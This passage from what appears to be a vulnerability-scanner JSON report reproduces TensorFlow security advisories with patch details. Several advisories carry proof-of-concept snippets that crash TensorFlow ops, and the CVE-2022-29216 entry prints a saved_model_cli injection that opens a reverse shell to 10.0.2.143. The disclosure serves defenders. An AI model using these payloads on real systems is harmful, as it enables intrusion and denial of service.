                "markdown": "**Vulnerability CVE-2022-29209**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29209)|\n\n### Impact\nThe [macros that TensorFlow uses for writing assertions (e.g., `CHECK_LT`, `CHECK_GT`, etc.)](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/platform/default/logging.h) have an incorrect logic when comparing `size_t` and `int` values. Due to type conversion rules, several of the macros would trigger incorrectly.\n\n### Patches\nWe have patched the issue in GitHub commit [b917181c29b50cb83399ba41f4d938dc369109a1](https://github.com/tensorflow/tensorflow/commit/b917181c29b50cb83399ba41f4d938dc369109a1) (merging GitHub PR [#55730](https://github.com/tensorflow/tensorflow/pull/55730)).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55530)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29195",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29195"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29195",
              "help": {
                "text": "Vulnerability CVE-2022-29195\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29195)\n### Impact\nThe implementation of [`tf.raw_ops.StagePeek`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/stage_op.cc#L261) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nindex = tf.constant([], shape=[0], dtype=tf.int32)\ntf.raw_ops.StagePeek(index=index, dtypes=[tf.int32])\n```\n  \nThe code assumes `index` is a scalar but there is no validation for this before accessing its value:\n  \n```cc\nstd::size_t index = ctx-\u003einput(0).scalar\u003cint\u003e()();\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [cebe3c45d76357d201c65bdbbf0dbe6e8a63bbdb](https://github.com/tensorflow/tensorflow/commit/cebe3c45d76357d201c65bdbbf0dbe6e8a63bbdb).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability CVE-2022-29195**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29195)|\n\n### Impact\nThe implementation of [`tf.raw_ops.StagePeek`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/stage_op.cc#L261) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nindex = tf.constant([], shape=[0], dtype=tf.int32)\ntf.raw_ops.StagePeek(index=index, dtypes=[tf.int32])\n```\n  \nThe code assumes `index` is a scalar but there is no validation for this before accessing its value:\n  \n```cc\nstd::size_t index = ctx-\u003einput(0).scalar\u003cint\u003e()();\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [cebe3c45d76357d201c65bdbbf0dbe6e8a63bbdb](https://github.com/tensorflow/tensorflow/commit/cebe3c45d76357d201c65bdbbf0dbe6e8a63bbdb).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29193",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29193"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29193",
              "help": {
                "text": "Vulnerability CVE-2022-29193\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29193](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29193)\n### Impact\nThe implementation of [`tf.raw_ops.TensorSummaryV2`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/summary_tensor_op.cc#L33-L58) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport numpy as np\nimport tensorflow as tf\n\ntf.raw_ops.TensorSummaryV2(\n  tag=np.array(`test`),\n  tensor=np.array(3),\n  serialized_summary_metadata=tf.io.encode_base64(np.empty((0))))\n```\n\nThe code assumes `axis` is a scalar but there is no validation for this.\n\n```cc\n    const Tensor\u0026 serialized_summary_metadata_tensor = c-\u003einput(2);\n    // ...\n    ParseFromTString(serialized_summary_metadata_tensor.scalar\u003ctstring\u003e()(),\n                     v-\u003emutable_metadata());\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [290bb05c80c327ed74fae1d089f1001b1e2a4ef7](https://github.com/tensorflow/tensorflow/commit/290bb05c80c327ed74fae1d089f1001b1e2a4ef7).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n    \n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University and Hong Jin from Singapore Management University.",
                "markdown": "**Vulnerability CVE-2022-29193**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29193](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29193)|\n\n### Impact\nThe implementation of [`tf.raw_ops.TensorSummaryV2`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/summary_tensor_op.cc#L33-L58) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport numpy as np\nimport tensorflow as tf\n\ntf.raw_ops.TensorSummaryV2(\n  tag=np.array(`test`),\n  tensor=np.array(3),\n  serialized_summary_metadata=tf.io.encode_base64(np.empty((0))))\n```\n\nThe code assumes `axis` is a scalar but there is no validation for this.\n\n```cc\n    const Tensor\u0026 serialized_summary_metadata_tensor = c-\u003einput(2);\n    // ...\n    ParseFromTString(serialized_summary_metadata_tensor.scalar\u003ctstring\u003e()(),\n                     v-\u003emutable_metadata());\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [290bb05c80c327ed74fae1d089f1001b1e2a4ef7](https://github.com/tensorflow/tensorflow/commit/290bb05c80c327ed74fae1d089f1001b1e2a4ef7).\n    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n    \n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University and Hong Jin from Singapore Management University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29216",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29216"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29216",
              "help": {
                "text": "Vulnerability CVE-2022-29216\nSeverity: high\nFixed Version: 2.8.1\nLink: [CVE-2022-29216](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29216)\n### Impact\nTensorFlow`s `saved_model_cli` tool is vulnerable to a code injection:\n\n```\nsaved_model_cli run --input_exprs `x=print(\"malicious code to run\")` --dir ./\n--tag_set serve --signature_def serving_default\n```\n\nThis can be used to open a reverse shell                                      \n\n```\nsaved_model_cli run --input_exprs `hello=exec(\"\"\"\nimport socket\nimport\nsubprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.0.2.143\",33419))\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")`\n--dir ./ --tag_set serve --signature_def serving_default\n```\n\nThis is because [the fix](https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7) for [CVE-2021-41228](https://nvd.nist.gov/vuln/detail/CVE-2021-41228) was incomplete. Under [certain code paths](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574) it still allows unsafe execution:\n\n```python\ndef preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(`;`)):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n```\n\nThis code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.\n\nHowever, given that the tool is always run manually, the impact of this is still not severe. We have now removed the `safe=False` argument, so all parsing is done withough calling `eval`.\n\n### Patches\nWe have patched the issue in GitHub commit [c5da7af048611aa29e9382371f0aed5018516cac](https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.",
                "markdown": "**Vulnerability CVE-2022-29216**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.8.1|[CVE-2022-29216](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29216)|\n\n### Impact\nTensorFlow`s `saved_model_cli` tool is vulnerable to a code injection:\n\n```\nsaved_model_cli run --input_exprs `x=print(\"malicious code to run\")` --dir ./\n--tag_set serve --signature_def serving_default\n```\n\nThis can be used to open a reverse shell                                      \n\n```\nsaved_model_cli run --input_exprs `hello=exec(\"\"\"\nimport socket\nimport\nsubprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"10.0.2.143\",33419))\nsubprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\"\")`\n--dir ./ --tag_set serve --signature_def serving_default\n```\n\nThis is because [the fix](https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7) for [CVE-2021-41228](https://nvd.nist.gov/vuln/detail/CVE-2021-41228) was incomplete. Under [certain code paths](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574) it still allows unsafe execution:\n\n```python\ndef preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  # ...\n\n  for input_raw in filter(bool, input_exprs_str.split(`;`)):\n    # ...\n    if safe:\n      # ...\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict\n```\n\nThis code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.\n\nHowever, given that the tool is always run manually, the impact of this is still not severe. We have now removed the `safe=False` argument, so all parsing is done withough calling `eval`.\n\n### Patches\nWe have patched the issue in GitHub commit [c5da7af048611aa29e9382371f0aed5018516cac](https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-29191",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29191"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29191",
              "help": {
                "text": "Vulnerability CVE-2022-29191\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29191](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29191)\n### Impact\nThe implementation of [`tf.raw_ops.GetSessionTensor`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/session_ops.cc#L94-L112) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nhandle = tf.constant(\"[]\", shape=[0], dtype=tf.string)\ntf.raw_ops.GetSessionTensor(handle=handle)\n```\n  \nThe code assumes `handle` is a scalar but there is no validation for this:\n  \n```cc\n    const Tensor\u0026 handle = ctx-\u003einput(0);\n    const string\u0026 name = handle.scalar\u003ctstring\u003e()();\n```\n\n### Patches\nWe have patched the issue in GitHub commit [48305e8ffe5246d67570b64096a96f8e315a7281](https://github.com/tensorflow/tensorflow/commit/48305e8ffe5246d67570b64096a96f8e315a7281).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability CVE-2022-29191**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29191](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29191)|\n\n### Impact\nThe implementation of [`tf.raw_ops.GetSessionTensor`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/session_ops.cc#L94-L112) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nhandle = tf.constant(\"[]\", shape=[0], dtype=tf.string)\ntf.raw_ops.GetSessionTensor(handle=handle)\n```\n  \nThe code assumes `handle` is a scalar but there is no validation for this:\n  \n```cc\n    const Tensor\u0026 handle = ctx-\u003einput(0);\n    const string\u0026 name = handle.scalar\u003ctstring\u003e()();\n```\n\n### Patches\nWe have patched the issue in GitHub commit [48305e8ffe5246d67570b64096a96f8e315a7281](https://github.com/tensorflow/tensorflow/commit/48305e8ffe5246d67570b64096a96f8e315a7281).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29203",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29203"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29203",
              "help": {
                "text": "Vulnerability CVE-2022-29203\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29203)\n### Impact\nThe implementation of `tf.raw_ops.SpaceToBatchND` (in all backends such as XLA and handwritten kernels) is vulnerable to an integer overflow:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant(-3.5e+35, shape=[10,19,22], dtype=tf.float32)\nblock_shape = tf.constant(-1879048192, shape=[2], dtype=tf.int64)\npaddings = tf.constant(0, shape=[2,2], dtype=tf.int32)\ntf.raw_ops.SpaceToBatchND(input=input, block_shape=block_shape, paddings=paddings)\n```\n\nThe result of this integer overflow is used to allocate the output tensor, hence we get a denial of service via a `CHECK`-failure (assertion failure), as in [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md).\n\n### Patches\nWe have patched the issue in GitHub commit [acd56b8bcb72b163c834ae4f18469047b001fadf](https://github.com/tensorflow/tensorflow/commit/acd56b8bcb72b163c834ae4f18469047b001fadf).\n  \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-29203**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29203)|\n\n### Impact\nThe implementation of `tf.raw_ops.SpaceToBatchND` (in all backends such as XLA and handwritten kernels) is vulnerable to an integer overflow:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant(-3.5e+35, shape=[10,19,22], dtype=tf.float32)\nblock_shape = tf.constant(-1879048192, shape=[2], dtype=tf.int64)\npaddings = tf.constant(0, shape=[2,2], dtype=tf.int32)\ntf.raw_ops.SpaceToBatchND(input=input, block_shape=block_shape, paddings=paddings)\n```\n\nThe result of this integer overflow is used to allocate the output tensor, hence we get a denial of service via a `CHECK`-failure (assertion failure), as in [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md).\n\n### Patches\nWe have patched the issue in GitHub commit [acd56b8bcb72b163c834ae4f18469047b001fadf](https://github.com/tensorflow/tensorflow/commit/acd56b8bcb72b163c834ae4f18469047b001fadf).\n  \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29197",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29197"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29197",
              "help": {
                "text": "Vulnerability CVE-2022-29197\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29197](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29197)\n### Impact\nThe implementation of [`tf.raw_ops.UnsortedSegmentJoin`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/unsorted_segment_join_op.cc#L92-L95) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.UnsortedSegmentJoin(\n  inputs=tf.constant(\"this\", shape=[12], dtype=tf.string),\n  segment_ids=tf.constant(0, shape=[12], dtype=tf.int64),\n  num_segments=tf.constant(0, shape=[12], dtype=tf.int64))\n``` \n  \nThe code assumes `num_segments` is a scalar but there is no validation for this before accessing its value:\n\n```cc\nconst Tensor\u0026 num_segments_tensor = context-\u003einput(2);\nOP_REQUIRES(context, num_segments_tensor.NumElements() != 0,\n            errors::InvalidArgument(\"Number of segments cannot be empty.\"));\nauto num_segments = num_segments_tensor.scalar\u003cNUM_SEGMENTS_TYPE\u003e()();\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [13d38a07ce9143e044aa737cfd7bb759d0e9b400](https://github.com/tensorflow/tensorflow/commit/13d38a07ce9143e044aa737cfd7bb759d0e9b400).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-29197**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29197](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29197)|\n\n### Impact\nThe implementation of [`tf.raw_ops.UnsortedSegmentJoin`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/unsorted_segment_join_op.cc#L92-L95) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.UnsortedSegmentJoin(\n  inputs=tf.constant(\"this\", shape=[12], dtype=tf.string),\n  segment_ids=tf.constant(0, shape=[12], dtype=tf.int64),\n  num_segments=tf.constant(0, shape=[12], dtype=tf.int64))\n``` \n  \nThe code assumes `num_segments` is a scalar but there is no validation for this before accessing its value:\n\n```cc\nconst Tensor\u0026 num_segments_tensor = context-\u003einput(2);\nOP_REQUIRES(context, num_segments_tensor.NumElements() != 0,\n            errors::InvalidArgument(\"Number of segments cannot be empty.\"));\nauto num_segments = num_segments_tensor.scalar\u003cNUM_SEGMENTS_TYPE\u003e()();\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [13d38a07ce9143e044aa737cfd7bb759d0e9b400](https://github.com/tensorflow/tensorflow/commit/13d38a07ce9143e044aa737cfd7bb759d0e9b400).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-29198",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-29198"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29198",
              "help": {
                "text": "Vulnerability CVE-2022-29198\nSeverity: medium\nFixed Version: 2.8.1\nLink: [CVE-2022-29198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29198)\n### Impact\nThe implementation of [`tf.raw_ops.SparseTensorToCSRSparseMatrix`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse/sparse_tensor_to_csr_sparse_matrix_op.cc#L65-L119) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant(53, shape=[3], dtype=tf.int64)\nvalues = tf.constant(0.554979503, shape=[218650], dtype=tf.float32)\ndense_shape = tf.constant(53, shape=[3], dtype=tf.int64)\n    \ntf.raw_ops.SparseTensorToCSRSparseMatrix(\n  indices=indices,\n  values=values,\n  dense_shape=dense_shape)\n```\n\nThe code assumes `dense_shape` is a vector and `indices` is a matrix (as part of requirements for sparse tensors) but there is no validation for this:\n  \n```cc\n    const Tensor\u0026 indices = ctx-\u003einput(0);\n    const Tensor\u0026 values = ctx-\u003einput(1);\n    const Tensor\u0026 dense_shape = ctx-\u003einput(2);\n    const int rank = dense_shape.NumElements();\n    OP_REQUIRES(ctx, rank == 2 || rank == 3,\n                errors::InvalidArgument(\"SparseTensor must have rank 2 or 3; \",\n                                        \"but indices has rank: \", rank));\n    auto dense_shape_vec = dense_shape.vec\u003cint64_t\u003e();\n    // ...\n    OP_REQUIRES_OK(\n        ctx,\n        coo_to_csr(batch_size, num_rows, indices.template matrix\u003cint64_t\u003e(),\n                   batch_ptr.vec\u003cint32\u003e(), csr_row_ptr.vec\u003cint32\u003e(),\n                   csr_col_ind.vec\u003cint32\u003e()));\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ea50a40e84f6bff15a0912728e35b657548cef11](https://github.com/tensorflow/tensorflow/commit/ea50a40e84f6bff15a0912728e35b657548cef11).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",
                "markdown": "**Vulnerability CVE-2022-29198**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.8.1|[CVE-2022-29198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29198)|\n\n### Impact\nThe implementation of [`tf.raw_ops.SparseTensorToCSRSparseMatrix`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse/sparse_tensor_to_csr_sparse_matrix_op.cc#L65-L119) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant(53, shape=[3], dtype=tf.int64)\nvalues = tf.constant(0.554979503, shape=[218650], dtype=tf.float32)\ndense_shape = tf.constant(53, shape=[3], dtype=tf.int64)\n    \ntf.raw_ops.SparseTensorToCSRSparseMatrix(\n  indices=indices,\n  values=values,\n  dense_shape=dense_shape)\n```\n\nThe code assumes `dense_shape` is a vector and `indices` is a matrix (as part of requirements for sparse tensors) but there is no validation for this:\n  \n```cc\n    const Tensor\u0026 indices = ctx-\u003einput(0);\n    const Tensor\u0026 values = ctx-\u003einput(1);\n    const Tensor\u0026 dense_shape = ctx-\u003einput(2);\n    const int rank = dense_shape.NumElements();\n    OP_REQUIRES(ctx, rank == 2 || rank == 3,\n                errors::InvalidArgument(\"SparseTensor must have rank 2 or 3; \",\n                                        \"but indices has rank: \", rank));\n    auto dense_shape_vec = dense_shape.vec\u003cint64_t\u003e();\n    // ...\n    OP_REQUIRES_OK(\n        ctx,\n        coo_to_csr(batch_size, num_rows, indices.template matrix\u003cint64_t\u003e(),\n                   batch_ptr.vec\u003cint32\u003e(), csr_row_ptr.vec\u003cint32\u003e(),\n                   csr_col_ind.vec\u003cint32\u003e()));\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ea50a40e84f6bff15a0912728e35b657548cef11](https://github.com/tensorflow/tensorflow/commit/ea50a40e84f6bff15a0912728e35b657548cef11).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and 